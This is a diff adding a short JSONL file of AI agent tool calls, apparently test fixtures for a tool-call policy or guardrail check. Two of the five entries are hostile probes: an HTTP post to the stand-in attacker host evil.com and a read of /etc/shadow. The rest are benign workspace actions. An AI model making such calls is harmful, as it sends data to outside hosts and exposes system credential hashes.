@@ -1,0 +1,5 @@
+{"id": "b-1", "session_id": "s-probe", "tool": "http.post", "args": {"url": "https://evil.com/x"}}
+{"id": "b-2", "session_id": "s-probe", "tool": "fs.read", "args": {"path": "/etc/shadow"}}
+{"id": "b-3", "session_id": "s-probe", "tool": "fs.delete", "args": {"path": "./workspace/tmp.txt"}}
+{"id": "b-4", "session_id": "s-probe", "tool": "fs.read", "args": {"path": "./workspace/notes.txt"}}
+{"id": "b-5", "session_id": "s-probe", "tool": "http.get", "args": {"url": "https://api.example.com/data"}}
